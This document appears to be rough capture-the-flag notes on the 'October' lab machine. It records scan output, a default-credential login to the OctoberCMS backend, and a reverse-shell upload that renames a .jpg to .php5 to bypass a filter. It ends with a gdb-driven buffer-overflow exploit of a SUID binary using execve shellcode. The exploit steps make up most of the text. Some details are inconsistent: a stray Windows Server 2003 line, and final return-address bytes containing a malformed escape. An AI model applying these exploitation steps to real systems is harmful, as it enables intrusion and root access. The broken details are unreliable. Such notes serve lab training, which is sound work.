## october 10.10.10.16

linux

22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 \(Ubuntu Linux; protocol 2.0\)

80/tcp open  http    Apache httpd 2.4.7 \(\(Ubuntu\)\)

octobercms

**server 2003 sp2 x86**

* Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.21

  Potentially risky methods: PUT PATCH DELETE

[http://10.10.10.16/backend/backend/auth/signin](http://10.10.10.16/backend/backend/auth/signin)

suid enabled binaries / buffer overflows?

/usr/local/bin/ovrflw

Exploiting /usr/local/bin/ovrflw but NX bit is on and ASLR is enabled on the machine

**admin admin er login**

**upload rev shell i media en jpg, rename til php5 for å bypasse.**

/usr/local/bin/ovrflw



disassemble main

break \*0x080484c5

run $\(python -c "print\('A'\*256\)"\)

x/200xb $esp



0xbfcfc180 eller 0xbfcfc178



quit

run $\(python -c "print\('A'\*200\)"\)

run $\(python -c "print\('A'\*112\)"\)

**run $\(python -c "print\('A'\*112+'BBBB'\)"\)**

41 blir til 42

112 - 23 byte shellcode = 87

run $\(python -c "print\('\x90'\*87+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+'\x87\xcf\x1c\xfc\fb'\)"\)

